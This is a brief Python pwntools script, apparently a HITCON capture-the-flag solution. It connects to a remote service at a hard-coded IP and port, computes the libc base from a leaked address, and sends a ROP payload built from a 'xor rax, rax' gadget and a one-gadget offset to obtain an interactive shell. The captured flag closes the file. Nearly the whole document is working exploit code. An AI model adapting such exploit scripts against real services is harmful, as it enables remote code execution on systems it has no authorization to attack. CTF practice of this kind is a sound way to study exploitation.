#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

r = remote("13.113.242.0", 31337)

libc_base = int(r.recvline(), 16) - 0x203f1
log.info("libc_base = " + hex(libc_base))

r.send(flat(
    libc_base + 0x8dbd5, # xor rax, rax
    libc_base + 0x45526)
)

r.interactive()

# hitcon{make_one_gadget_great_again!}
